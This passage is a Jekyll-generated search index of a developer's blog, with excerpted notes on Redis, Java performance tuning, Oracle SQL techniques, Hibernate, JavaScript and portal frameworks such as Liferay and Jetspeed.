

[
  
  
    {
      "title"    : "页面没有找到",
      "url"      : "http://localhost:4000/404.html"
    } ,
  
  
  
    {
      "title"    : "About",
      "url"      : "http://localhost:4000/about/"
    } ,
  
  
  
    {
      "title"    : "归档",
      "url"      : "http://localhost:4000/archives/"
    } ,
  
  
  
    {
      "title"    : "Categories",
      "url"      : "http://localhost:4000/categories/"
    } ,
  
  
  
  
  
    {
      "title"    : "Links",
      "url"      : "http://localhost:4000/links/"
    } ,
  
  
  
    {
      "title"    : "Open Source Projects",
      "url"      : "http://localhost:4000/open-source/"
    } ,
  
  
  
  
  
    {
      "title"    : "Wiki",
      "url"      : "http://localhost:4000/wiki/"
    } ,
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

  
    {
      "title"    : "Welcome to Donghua&#39;s Home Page!",
      "category" : "jekyll",
      "content": "You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated. To add new posts, simply add a file in the _posts directory that follows the convention YYYY-MM-DD-name-of-post.ext and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works. Jekyll also offers powerful support for code snippets: def print_hi(name) puts Hi, #{name} end print_hi('Tom') #=&gt; prints 'Hi, Tom' to STDOUT. Check out the Jekyll docs for more info on how to get the most out of Jekyll. File all bugs/feature requests at Jekyll’s GitHub repo. If you have questions, you can ask them on Jekyll Talk. ",
      "url"      : "http://localhost:4000/2017/01/25/welcome-to-jekyll/"
    } ,
  
    {
      "title"    : "redis版本特性",
      "category" : "blog",
      "content": "Reids各版本特性 Redis 4 feature module psync2 LFU eviction policy mixed rdb-aof format del/flushall/flushdb async MEMORY command CLUSTER DOCKER/NAT support redis 3 Redis Cluster redis 2.8 psync Slaves explicitly ping masters now, a master is able to detect a timed out slave independently. Masters can stop accepting writes if not enough slaves with a given maximum latency are connected Keyspace changes notifications via Pub/Sub CONFIG SET maxclients is now available Ability to bind multiple IP addresses Set process names so that you can recognize, in the &quot;ps&quot; command output, the listening port of an instance, or if it is a saving child Automatic memory check on crash CONFIG REWRITE is able to materialize the changes in the configuration operated using CONFIG SET into the redis.conf file PUBSUB command for Pub/Sub introspection capabilities EVALSHA can now be replicated as such, without requiring to be expanded to a full EVAL for the replication link Better Lua scripts error reporting SDIFF performance improved redis 2.6 支持lua脚本。 VM（虚拟内存）去掉了。 对于client的limit限制变成无限制。 aof性能提升了不少。 key的过滤时间可以支持毫秒级别了，原来是秒。 list与hash 的属性filed或value包含小整数，内存优化列好（使用了jemalloc，以前是malloc）。 提供了BITCOUNT与BITOP，前者支持位值count，后者支持了位操作。（以前只支持key-value 的置位操作） 支持新命令dump以及restore ，即序列化与反序列化操作。 大数据存储性能优化 ",
      "url"      : "http://localhost:4000/2017/01/25/redis-feature/"
    } ,
  
    {
      "title"    : "java性能调优",
      "category" : "blog",
      "content": "java heap dump jps -ml 得到java进程号 pid jmap -dump:format=b,file=heap.dump [pid] 或者 jmap -histo pid &gt; dump.log jhat heap.dump 访问http://localhost:7000 thread dump ps -ef | grep 进程名 | grep -v grep top -Hp pid得到线程id tid printf &quot;%x  &quot; tid得到线程id的十六进制表示如54ee jstack pid | grep 54ee 根据stack信息找到有问题的类和方法 jstat jstat -gc pid 250 4 S0C、S1C、S0U、S1U：Survivor 0/1区容量（Capacity）和使用量（Used） EC、EU：Eden区容量和使用量 OC、OU：年老代容量和使用量 PC、PU：永久代容量和使用量 YGC、YGT：年轻代GC次数和GC耗时 FGC、FGCT：Full GC次数和Full GC耗时 GCT：GC总耗时 jstat -gccapacity pid jstat -gcutil pid jstat -gcnew pid jstat -gcnewcapacity pid jstat -gcold pid jstat -gcoldcapacity pid jstat -gcpermcapacity pid jstat -class pid jstat -compiler pid jstat -printcompilation pid ",
      "url"      : "http://localhost:4000/2017/02/04/java-dump-tuning/"
    } ,
  
    {
      "title"    : "TCP状态",
      "category" : "blog",
      "content": "TCP连接状态 统计各种TCP状态的链接数 netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'  ",
      "url"      : "http://localhost:4000/2017/02/04/tcp-status/"
    } ,
  
    {
      "title"    : "数据库 replication and partition",
      "category" : "iteye",
      "content": "数据库replication和partition 分库/拆库 partition应用在划分正交的业务领域到不同的数据库 复制 replication同loader balance用在一起。有同步和异步两种方式。 Synchoronus 网速要求比较快，用在业务关键的领域比如金融。不同节点相互备份和partitioning Asynchoronous 异步方式用Queue，Pub/Sub方式。应用场景包括disarster recovery,网速慢时 ",
      "url"      : "http://localhost:4000/2017/02/11/database-partition-replication/"
    } ,
  
    {
      "title"    : "rownum解析",
      "category" : "iteye",
      "content": "Oracle rownum ** 摘自：http://tenn.iteye.com/blog/99339，仅供自学 **  在Oracle中，要按特定条件查询前N条记录，用个rownum就搞定了。 select * from emp where rownum &lt;= 5 而且书上也告诫，不能对rownum用&quot;&gt;&quot;，这也就意味着，如果你想用 select * from emp where rownum &gt; 5 则是失败的。要知道为什么会失败，则需要了解rownum背后的机制： Oracle executes your query. Oracle fetches the first row and calls it row number 1. Have we gotten past row number meets the criteria? If no, then Oracle discards the row, If yes, then Oracle return the row. Oracle fetches the next row and advances the row number (to 2, and then to 3, and then to 4, and so forth). Go to step 3. 了解了原理，就知道rownum&gt;不会成功，因为在第三步的时候查询出的行已经被丢弃，第四步查出来的rownum仍然是1,这样永远也不会成功。 同样道理，rownum如果单独用=,也只有在rownum=1时才有用。   对于rownum来说它是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2，依此类推，这个伪字段可以用于限制查询返回的总行数，而且rownum不能以任何表的名称作为前缀。 举例说明： 例如表： student(学生)表，表结构为： ID　　　    char(6)　　　　　 --学号 name　　　　VARCHAR2(100)　　　--姓名 create table student (ID char(6), name VARCHAR2(100)); insert into sale values('200001',‘张一’); insert into sale values('200002',‘王二’); insert into sale values('200003',‘李三’); insert into sale values('200004',‘赵四’); commit; (1) rownum 对于等于某值的查询条件 如果希望找到学生表中第一条学生的信息，可以使用rownum=1作为条件。但是想找到学生表中第二条学生的信息，使用rownum=2结果查不到数据。因为rownum都是从1开始，但是1以上的自然数在rownum做等于判断是时认为都是false条件，所以无法查到rownum = n（n&gt;1的自然数）。 SQL&gt; select rownum,id,name from student where rownum=1;（可以用在限制返回记录条数的地方，保证不出错，如：隐式游标） SQL&gt; select rownum,id,name from student where rownum=1;     ROWNUM ID     NAME ----------------------         1 200001 张一 SQL&gt; select rownum,id,name from student where rownum =2;     ROWNUM ID     NAME （2）rownum对于大于某值的查询条件    如果想找到从第二行记录以后的记录，当使用rownum&gt;2是查不出记录的，原因是由于rownum是一个总是从1开始的伪列，Oracle 认为rownum&gt; n(n&gt;1的自然数)这种条件依旧不成立，所以查不到记录 SQL&gt; select rownum,id,name from student where rownum &gt;2; ROWNUM ID     NAME 那如何才能找到第二行以后的记录呀。可以使用以下的子查询方法来解决。注意子查询中的rownum必须要有别名，否则还是不会查出记录来，这是因为rownum不是某个表的列，如果不起别名的话，无法知道rownum是子查询的列还是主查询的列。 SQL&gt;select * from(select rownum no ,id,name from student) where no&gt;2;         NO ID     NAME ---------------- 3 200003 李三          4 200004 赵四 SQL&gt; select * from(select rownum,id,name from student)where rownum&gt;2;     ROWNUM ID     NAME （3）rownum对于小于某值的查询条件 如果想找到第三条记录以前的记录，当使用rownum&lt;3是能得到两条记录的。显然rownum对于rownum&lt;n（(n&gt;1的自然数）的条件认为是成立的，所以可以找到记录。 SQL&gt; select rownum,id,name from student where rownum &lt;3;     ROWNUM ID     NAME ---------------------- 1 200001 张一         2 200002 王二 综上几种情况，可能有时候需要查询rownum在某区间的数据，那怎么办呀从上可以看出rownum对小于某值的查询条件是人为true的，rownum对于大于某值的查询条件直接认为是false的，但是可以间接的让它转为认为是true的。那就必须使用子查询。例如要查询rownum在第二行到第三行之间的数据，包括第二行和第三行数据，那么我们只能写以下语句，先让它返回小于等于三的记录行，然后在主查询中判断新的rownum的别名列大于等于二的记录行。但是这样的操作会在大数据集中影响速度。 SQL&gt; select * from (select rownum no,id,name from student where rownum&lt;=3 ) where no &gt;=2;         NO ID     NAME ------------------ 2 200002 王二          3 200003 李三 （4）rownum和排序 Oracle中的rownum的是在取数据的时候产生的序号，所以想对指定排序的数据去指定的rowmun行数据就必须注意了。 SQL&gt; select rownum ,id,name from student order by name;     ROWNUM ID     NAME i ---------- ------ ------          3 200003 李三           2 200002 王二          1 200001 张一          4 200004 赵四 可以看出，rownum并不是按照name列来生成的序号。系统是按照记录插入时的顺序给记录排的号，rowid也是顺序分配的。为了解决这个问题，必须使用子查询 SQL&gt; select rownum ,id,name from (select * from student order by name);     ROWNUM ID     NAME ---------- ------ ----          1 200003 李三          2 200002 王二           3 200001 张一           4 200004 赵四 这样就成了按name排序，并且用rownum标出正确序号（有小到大） ",
      "url"      : "http://localhost:4000/2017/02/11/iteye-204/"
    } ,
  
    {
      "title"    : "Oracle Decode用法",
      "category" : "iteye",
      "content": "oracle decode from: http://www.adp-gmbh.ch/ora/sql/decode.html decode (expression, search_1, result_1) decode (expression, search_1, result_1, search_2, result_2) decode (expression, search_1, result_1, search_2, result_2, ...., search_n, result_n) decode (expression, search_1, result_1, default) decode (expression, search_1, result_1, search_2, result_2, default) decode (expression, search_1, result_1, search_2, result_2, ...., search_n, result_n, default) decode compares expression to the search_x expressions and, if matches, returns result_x. If not, returns default, or, if default is left out, null. a sample: create table a (x int, b int); insert into a values (1,2); insert into a values (1,3); insert into a values (2,4); insert into a values (2,5); insert into a values (3,6); select * from a where b = decode (x,1,2,2,4); X  B ---------- ---------- 1  2 2  4 ",
      "url"      : "http://localhost:4000/2017/02/11/oracle-decode/"
    } ,
  
    {
      "title"    : "如何删除数据库表中相同记录",
      "category" : "iteye",
      "content": "如何删除表中相同字段值的记录（比如相同的EMPNO，假设没有主键） 方法1   DELETE FROM EMP WHERE ROWID NOT IN(SELECT MAX(ROWID) FROM EMP GROUP BY EMPNO); 方法2 DELETE FROM emp e WHERE ROWID NOT IN ( SELECT MIN(ROWID) FROM emp a WHERE e.empno=a.empno); 方法3 DELETE FROM table_name A WHERE ROWID &gt; ( SELECT min(ROWID) FROM table_name B WHERE A.col = B.col); ",
      "url"      : "http://localhost:4000/2017/02/11/oracle-delete-duplicate/"
    } ,
  
    {
      "title"    : "Oracle 笔记",
      "category" : "iteye",
      "content": "Oracle 笔记 rownum and rowid rownum是在得到结果集的时候产生的，用于标记结果集中结果顺序的一个字段，这个字段被称为“伪数列”，也就是事实上不存在的一个数列。它的特点是按顺序标记，而且是逐次递加的，换句话说就是只有有rownum=1的记录，才可能有rownum=2的记录。   和rownum相似，oracle还提供了另外一个伪数列：rowid。不过rowid和rownum不同，一般说来每一行数据对应的rowid是固定而且唯一的，在这一行数据存入数据库的时候就确定了。可以利用rowid来查询记录，而且通过rowid查询记录是查询速度最快的查询方法。(这个我没有试过，另外要记住一个长度在18位，而且没有太明显规律的字符串是一个很困难的事情，所以我个人认为利用rowid查询记录的实用性不是很大)rowid只有在表发生移动(比如表空间变化，数据导入/导出以后)，才会发生变化。顺便提一下，Oracle中的伪数列有：rownum,rowid,nextval,currval   left join / right join tableA left join tableB on 相当与 from tableA,tableB where tableA.id=tableB.id(+) 最终记录数与tableA记录数相同   tableA right join tableB on 最终记录数与tableB记录数相同   truncate 与 delete 区别 truncate：自动commit, 不能rollback，速度快，是DDL delete：程序员控制commit，commit前可以rollback，速度慢，是DML，   PL/SQL function与Procedure区别   Function and Procedure both are PL/SQL blocks, main difference between function and procedure is - Function has to return some value using return clause whereas procedure may or may not return any value( no out parameter). We can use functions in SQL query but can't use procedure.   ",
      "url"      : "http://localhost:4000/2017/02/11/oracle-knowledge/"
    } ,
  
    {
      "title"    : "不用max函数返回表中最大值或者最小值",
      "category" : "iteye",
      "content": "不用max函数返回表中最大值或者最小值 返回Test表中字段num的最大值或者最小值（不用Max函数）, 为了好玩。：) 返回最大值 select distinct num from Test where num not in ( select lesser.num from Test as greater,Test as lesser where lesser.num&lt;greater.num)   返回最小值 select distinct num from Test where num not in ( select greater.num from Test as greater,Test as lesser where lesser.num&lt;greater.num)     原因是以下SQL返回的结果集中，lesser.num中包括所有num除了最大值，greater.num中包括所有num除了最小值： select lesser.num,greater.num from Test as lesser, Test as greater where lesser.num &lt; greater.num;   ",
      "url"      : "http://localhost:4000/2017/02/11/oracle-max-min/"
    } ,
  
    {
      "title"    : "返回奇数行或者偶数行数据库表记录",
      "category" : "iteye",
      "content": "Oracle返回奇数行或者偶数行数据库表记录 方法1用Decode函数 for even number of records select * from emp where rowid in (select decode(mod(rownum,2),0,rowid) from emp); for odd number of records select*from emp where rowid in (select decode(mod(rownum,2),1,rowid) from emp); 或者 FOR ODD NUMBER OF ROWS  SELECT * FROM emp WHERE rowid IN (SELECT DECODE(MOD(rownum,2),1,rowid,NULL) FROM emp); FOR EVEN NUMBER OF ROWS SELECT * FROM emp WHERE rowid IN (SELECT DECODE(MOD(rownum,2),0,rowid,NULL) FROM emp); 方法2用in子查询 Odd number of records: select * from emp where (rowid,1) in (select rowid, mod(rownum,2) from emp); Output:- 1 3 5 Even number of records: select * from emp where (rowid,0) in (select rowid, mod(rownum,2) from emp) Output:- 2 4 6   ",
      "url"      : "http://localhost:4000/2017/02/11/oracle-odd-even/"
    } ,
  
    {
      "title"    : "rank() analytic function",
      "category" : "iteye",
      "content": "Oracle rank As an analytic function, RANK computes the rank of each row returned from a query with respect to the other rows returned by the query, based on the values of the value_exprs in the order_by_clause. 返回工资第二高的员工 SELECT * FROM (   SELECT employee_id, last_name, salary,    RANK() OVER (ORDER BY salary DESC) EMPRANK   FROM employees) WHERE emprank = 2; verify result SELECT employee_id, last_name, salary, RANK() OVER (ORDER BY salary DESC) EMPRANK FROM employees;   另外一个例子 SELECT department_id,last_name,salary,commission_pct, RANK() OVER (PARTITION BY department_id ORDER BY salary DESC, commission_pct RANK FROM employees; ",
      "url"      : "http://localhost:4000/2017/02/11/oracle-rank/"
    } ,
  
    {
      "title"    : "start with....connect by...",
      "category" : "iteye，sql",
      "content": "Oracle start with select * from tablename start with cond1 connect by cond2 where cond3; 简单说来是将一个树状结构存储在一张表里，比如一个表中存在两个字段: id,parentid。那么通过表示每一条记录的parent是谁，就可以形成一个树状结构。 用上述语法的查询可以取得这棵树的所有记录。 其中COND1是根结点的限定语句，当然可以放宽限定条件，以取得多个根结点，实际就是多棵树。 COND2是连接条件，其中用PRIOR表示上一条记录，比如 CONNECT BY PRIOR ID=PRAENTID就是说上一条记录的ID是本条记录的PRAENTID，即本记录的父亲是上一条记录。 COND3是过滤条件，用于对返回的所有记录进行过滤. 比如我们需要在Oracle中存储一个树形的menu结构，可以添加两个字段MENU_ID与MENU_PID 如果这个菜单项是一级菜单，那么我们把它的MENU_PID设为0 如果这个菜单是另一个菜单的子菜单，那么我们就把它的MENU_PID设为它的父菜单的MENU_ID。 有了这样的结构，我们一个递归就能把这颗“树”显示出来。  SELECT * FROM T_SYS_MENU STARTWITH MENU_PID=0 CONNECT BY PRIOR MENU_ID=MENU_PID order by MENU_ID ",
      "url"      : "http://localhost:4000/2017/02/11/oracle-start-with/"
    } ,
  
    {
      "title"    : "通过网络加载类",
      "category" : "iteye",
      "content": "RMI / RPC / Web Service 调用时需要客户端服务端维护同样的调用接口? 利用java的对象流传送对象，将服务器端的任务以对象的方式传送给客户端，客户端同样适用对象流接收任务，并复原对象的各个属性。 ObjectOutputStream和ObjectInputStream ObjectOutputStream在传送对象的时候要求对象是实现了序列化接口的，这要求在编写任务的时候需要实现此接口。 ObjectInputStream在接收对象的时候，需要能够找到对应的类定义，这需要客户端启动之后，能够动态的加载任务类，可以考虑自定义Classloader，在特定的目录中加载任务类定义。这个过程也是由服务器端发起，服务器端在发送任务对象前，先判断任务对象的类定义（字节码）是否已经发送给了客户端，如果没有，则先发送字节码定义给客户端。   我猜：客户端的接口是为了客户端自定义的ClassLoader加载网络过来的对象流后，能够Cast成给定的对象。 ",
      "url"      : "http://localhost:4000/2017/02/11/rpc-stream/"
    } ,
  
    {
      "title"    : "测试工具",
      "category" : "iteye",
      "content": "测试工具 Quality Center9.2/10.0,以前称为Test Director 8。 管理Release Cycle，Test Case，Test Case 执行，defect,相互关联，报告，需求变更   自动化测试 Quick Test Professional, functional test IBM Rational Functonal Test   robotframework 性能测试 load runner,monitor CPU,Memory,IO等   postman for restful ",
      "url"      : "http://localhost:4000/2017/02/11/test-tool/"
    } ,
  
    {
      "title"    : "excel 功能",
      "category" : "iteye",
      "content": "  excel中功能很丰富，掌握了对程序员帮助很大。   基本的有 Filter功能。记得以前给一个老外发excel报表，他说漏掉了一些。我百思不得其解，明明都包括了啊。最后发现是filter功能过滤了，他没有注意到。这是一个题外话。   新公司有个牛人excel应用得很溜。最近学了一招 VLookup, 很好使。   基本上，VLOOKUP作用是 在表格或数值数组的首列查找指定的数值，并由此返回表格或数组当前行中指定列处的数值。 VLOOKUP(lookup_value,table_array,col_index_num,range_lookup) 参数定义如下： 1. Lookup_value    为需要在数组第一列中查找的数值。Lookup_value 可以为数值、引用或文本字符串。 2. Table_array    为需要在其中查找数据的数据表。可以使用对区域或区域名称的引用，例如数据库或列表。 3. Col_index_num    为 table_array 中待返回的匹配值的列序号。Col_index_num 为 1 时，返回 table_array 第一列中的数值；col_index_num 为 2，返回 table_array 第二列中的数值，以此类推。 4. Range_lookup    为一逻辑值，指明函数 VLOOKUP 返回时是精确匹配还是近似匹配。如果为 TRUE 或省略，则返回近似匹配值，也就是说，如果找不到精确匹配值，则返回小于 lookup_value 的最大数值；如果 range_value 为 FALSE，函数 VLOOKUP 将返回精确匹配值。   一个基本用法是： 在excel中我有一列数据Column A， 我需要找哪些在column F中出现了。方法是： 对应column A第一行数据在column B中用函数 ＝VLookUp(A2, sheet1!$a$2:$f$100, 1, false). 这样在Column B中非Null中都是匹配上的，通过filter功能可以过滤出来。   其他还有 ＝UPPer(A2)              =Lower(A2)   关键有两个地方： 1. 应用函数需要 ＝ 才能生效 2. 上面函数只是对一列中的一行数据生效了，对整列生效，需要选中已生效的那个Cell（A12）按住鼠标往下拖，该列所有行都会生效的。   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-1/"
    } ,
  
    {
      "title"    : "hibernate session 管理",
      "category" : "iteye",
      "content": " Session per Operation (Anti pattern)   2. Session per Request use &quot;Open Session In View&quot; when rendering layer seperate from servlet, e.g. in JSP   3. Session per Request with detached object when a user case spans several transaction, considering the user think time, we can detach and re-attach the object to different session. Here we mean one session on transaction. For making sure only one user modifying that data, we need to user optimistic lock such as automatic versioning to isolate business use case.   4. Session per Conversation the Hibernate Session can be disconnected from the underlying JDBC connection after the database transaction has been committed and reconnected when a new client request occurs. This pattern is known as session-per-conversation and makes even reattachment unnecessary. Automatic versioning is used to isolate concurrent modifications and the Session will not be allowed to be flushed automatically, but explicitly. ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-10/"
    } ,
  
    {
      "title"    : "Javascript Drag&amp;Drop 小例子",
      "category" : "iteye",
      "content": "&lt;!doctype html public &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;  &lt;title> 代码实例：拖动对象 Drag Object (兼容:IE、Firefox、Opera ... )  &lt;style> .dragAble {position:relative;cursor:move;}  &lt;script language=javascript> function moveMouse(e) { if (isdrag) { oDragObj.style.top = (nn6 ? nTY + e.clientY - y : nTY + event.clientY - y)+&quot;px&quot;; oDragObj.style.left = (nn6 ? nTX + e.clientX - x : nTX + event.clientX - x)+&quot;px&quot;; return false; } } function initDrag(e) { var oDragHandle = nn6 ? e.target : event.srcElement; var topElement = &quot;HTML&quot;; while (oDragHandle.tagName != topElement &amp;&amp; oDragHandle.className != &quot;dragAble&quot;) { oDragHandle = nn6 ? oDragHandle.parentNode : oDragHandle.parentElement; } if (oDragHandle.className==&quot;dragAble&quot;) { isdrag = true; oDragObj = oDragHandle; nTY = parseInt(oDragObj.style.top+0); y = nn6 ? e.clientY : event.clientY; nTX = parseInt(oDragObj.style.left+0); x = nn6 ? e.clientX : event.clientX; document.onmousemove=moveMouse; return false; } } document.onmousedown=initDrag; document.onmouseup=new Function(&quot;isdrag=false&quot;); //--&gt; 这些都是可拖动对象 我也可以动吗?      from:  http://blog.csdn.net/xyk0830/archive/2007/11/07/1871712.aspx ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-100/"
    } ,
  
    {
      "title"    : "liferay笔记",
      "category" : "iteye",
      "content": " 扩展开发方式       refer to:       1) http://www.liferay.com/web/guest/community/wiki/-/wiki/Main/Development%20Environment%20(Windows);jsessionid=DB374B4B6CDBE3F3211E4538AAB5CFB5       2) http://hi.baidu.com/joelli/blog/item/8205a0ed7103034579f05514.html 这个比较靠谱       主要步骤是： 1.1 安装对应的JDK，Ant，Tomcat。设置环境变量 1.2 下载liferay源文件并导入Eclipse 1.3  添加三个文件覆盖参数             app.server.{your_name}.properties:设置tomcat目录             release.{your_name}.properties: 设置EXT工程目录             build.{your_name}.properties: 设置Build.xml的一些属性              1.4  ant clean start build-ext   1.5 配置mysql         1.5.1 create database lportal       1.5.2  execute script liferay-portal-src-5.2.3  sql  portal-minimal. edit ext-impl/src/portal-ext.properties ## MySQL jdbc.default.driverClassName=com.mysql.jdbc.Driver jdbc.default.url=jdbc:mysql://localhost/lportal?useUnicode=true&amp;characterEncoding=UTF-8&amp;useFastDateParsing=false jdbc.default.username=root jdbc.default.password=     1.6  ant clean deploy        2. lifeRay plugin SDK 开发   2.1 download the plugins SDK from the 'Additional Files' section on the Liferay website. 2.2 This provides ant scripts, to create a simple JSR compliant portlet   ant -Dportlet.name= -Dportlet.display.name=&quot;&quot; create    2.3 转化成Eclipse project   ant setup-eclipse  2.4 自己搞定build path问题，这里的jar包都是指向liferay 源文件里面的lib 包。所以本地最好有liferay源文件.   2.5 ant deploy   2.6 liferay 页面可以用这个新添加的portlet了     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-101/"
    } ,
  
    {
      "title"    : "AJAX lib 比较",
      "category" : "iteye",
      "content": "摘自：http://www.ibm.com/developerworks/cn/web/wa-aj-advjquery/   结论 1：Mootools、jQuery 和 Dojo 在性能方面不分上下。 根据性能进行分类的话，这些库可以分为两组，而不管使用什么浏览器(FF,IE,Chrome)。Mootools、Dojo 和 jQuery 通常属于一个组别，而 Prototype 和 YUI 属于另一个组别，前一组要比后一组快得多。   JavaScript 速度差异的主要原因是每个浏览器都使用自己的 JavaScript 引擎。JavaScript 在这些浏览器中运行得到的时间差很大。jQuery 选择方法在 IE6 上运行比在 Chrome 上运行慢 10 倍。   结论 2：Prototype 和 YUI 的性能很慢   结论 3：浏览器对性能的影响是 JavaScript 库的 9 倍。您可以在特定情况下讨论哪个 JavaScript 库最快，但它最终的影响却是很小的！对于性能而言，浏览器的影响比库本身要大得多。   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-102/"
    } ,
  
    {
      "title"    : "Web相关",
      "category" : "iteye",
      "content": " Tomcat load balance/cluster/fail off   2. SSO based on CAS      tomcat      JBoss portal      SSL   3. Acegi filter / JAAS   4. ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-103/"
    } ,
  
    {
      "title"    : "Jetspeed2",
      "category" : "iteye",
      "content": "refer to: http://portals.apache.org/jetspeed-2/tutorial/01/genapp.html   Setup:   1.  generate two maven submodules: jetexpress-portal and jetexpress-pa.   mvn org.apache.maven.plugins:maven-archetype-plugin:2.0-alpha-4:generate        -DarchetypeGroupId=org.apache.portals.jetspeed-2        -DarchetypeArtifactId=jetspeed-archetype        -DarchetypeVersion=2.2.0        -DartifactId=jetexpress        -Dpackage=org.apache.portals.tutorials        -DgroupId=org.apache.portals.tutorials        -Dversion=1.0-SNAPSHOT   2. change file jetspeed-mvn-settings.xml   2.1 Find the org.apache.jetspeed.server.home configuration parameter and change the path to where you installed Tomcat   2.2 Find the org.apache.jetspeed.production.database.url configuration parameter   3. create file %USERPROFILE%.m2  settings.xml  org.apache.portals.jetspeed-2    4. mvn jetspeed:mvn -Dtarget=all     deploy to the tomcat server        access: http://localhost:8080/jetexpress/portal   5. wroking in  Eclipse Env   5.1 mvn eclipse:eclipse   5.2  In Eclipse, go to Window-&gt;Preferences-&gt;Java-&gt;Build Path-&gt;Classpath Variables-&gt;New and enter the location of your local Maven repository  M2_REPO (typically this is inside a .m2 directory in your user home/profile directory.   5.3 import jetexpress-portal and jetexpress-pa projects   5.4 add portlet in jetexpress-pa project   5.5 deploy to tomcat ENV   mvn jetspeed:mvn -Dtarget=deploy-pa mvn jetspeed:mvn -Dtarget=deploy-portal   access: http://localhost:8080/jetexpress/portal        Create A New Page:    1.  make dir under such as demo         jetexpress  jetexpress-portal  src  main  webapp  WEB-INF  pages  demo   2. copy and edit folder.metadata &amp; default-page.psml   3.  deploy mvn jetspeed:mvn -Dtarget=deploy-pa mvn jetspeed:mvn -Dtarget=deploy-portal   access: http://localhost:8080/jetexpress/portal   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-104/"
    } ,
  
    {
      "title"    : "IBM SOA 产品线",
      "category" : "iteye",
      "content": " Model Phase       Websphere Business Modeler     Rational Software Architect   2. Assemble Phase          Rational Appliction Developer      Websphere Integration Developer      Websphere Portlet Factory       ...   3. Deploy Phase      Websphere Application Server      Websphere Portal Server      Websphere Porcess Server      Websphere ESB      Websphere Message Broker      Websphere MQ      ...   4. Manage Phase        Tivoli Access Manager      Websphere Business Monitor      ...   5. Governance        Websphere Service Registry and Repository      Rational Asset Manager      ... ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-105/"
    } ,
  
    {
      "title"    : "Hibernate笔记",
      "category" : "iteye",
      "content": " inverse=true | false   2. cascade   3. lazy-loading   4. session-per-request &amp; open session filter   5. transaction demarcation ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-106/"
    } ,
  
    {
      "title"    : "多线程等待机制",
      "category" : "iteye",
      "content": "现有一个遗留系统中，用到了很多多线程。其中等待机制是这么做的: 1. 主线程在需要等待的时候，先开启一个等待线程。初始化时预定一个时间。等待线程启动后立刻 wait()/wait(nTime). 2. 主线程 join 等待线程 3. 外部事件到达时，interrupt 等待线程。E.g. in a listener or update method 4. 主线程继续执行下去 这种方式利用了InterruptedException控制业务逻辑，除了这个缺点外不知还有没有别的弊端？ ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-108/"
    } ,
  
    {
      "title"    : "Message Broker",
      "category" : "iteye",
      "content": "Message Broker based on RMI ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-109/"
    } ,
  
    {
      "title"    : "database batching insert",
      "category" : "iteye",
      "content": "In DB2, e.g if you issue below sql statement 100 times, insert into TableA (id , fields) values (1, 'val1'); insert into TableA (id , fields) values (2, 'val2'); insert into TableA (id , fields) values (3, 'val3'); ......................... insert into TableA (id , fields) values (100, 'val100'); if you set jdbc batch_size to 50, it could be only issue two sql to db instead as below: insert into TableA (id , fields) values (1, 'val1') , (2, 'val2') ,(3, 'val3') ,(4, 'val4') ,......,(50, 'val50') insert into TableA (id , fields) values (51, 'val51') , (52, 'val52') ,(53, 'val53') ,(54, 'val54'),...... ,(100, 'val100') ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-11/"
    } ,
  
    {
      "title"    : "RMI Implementation",
      "category" : "iteye",
      "content": "RMI provides the solution of communication between Java processes. For building a RMI Server/Client Application, below steps are considered: 1. define the Remote interfaces extends from java.rmi.Remote    these interfaces will also be provided to client.    note: all remote interfaces throw java.rmi.RemoteException 2. implement the remote interfaces, the implementation classes also extend java.rmi.server.UnicastRemoteObject to export the remote objects. 3. use java ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-110/"
    } ,
  
    {
      "title"    : "LDAP command",
      "category" : "iteye",
      "content": "#install ldap 1. install BerkeleyDB.4.6 2. add /usr/local/BerkeleyDB.4.6/lib to /etc/ld.so.conf, then execute ldconfig 3. env CPPFLAGS=&quot;-I/usr/local/BerkeleyDB.4.6/include&quot; LDFLAGS=&quot;-L/usr/local/BerkeleyDB.4.6/lib&quot;  ./configure --prefix /usr/local/openldap 4. make depend 5. make 6. make install 7. go to /usr/local/openldap/libexec execute ./slapd 8. ps -aux | grep slapd verify LDAP server is up #install ldap browser #for error:Can't connect to X11 windo ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-111/"
    } ,
  
    {
      "title"    : "日志系统",
      "category" : "iteye",
      "content": "异步log to file 1. 启动一个多线程，维护一个List列表。List中存放的是需要log的字符串。早期用Vector来考虑同步的问题，甚至可以包装Vector。加入wait/notify机制。 2. 主程序启动时打开文件，主程序结束时关闭文件。其他还有异常，rotate file时也需要关闭文件。   // Open the file output stream             logOutputStream = new FileOutputStream(this.fileName);          &amp;nbs ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-112/"
    } ,
  
    {
      "title"    : "获取java程序的系统参数",
      "category" : "iteye",
      "content": "执行java程序时传入的系统参数可以通过以下方式在程序中获取： java  -D参数1＝值1  java程序名     Properties props = new Properties(System.getProperties());     String outputMode = props.getProperty(&quot;参数1&quot;); ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-113/"
    } ,
  
    {
      "title"    : "java quartz",
      "category" : "iteye",
      "content": "SessionJob 一定要声明在SessionScheduler 类外面。 如果用作SessionScheduler的内部类会产生莫名其妙的错误。 ",
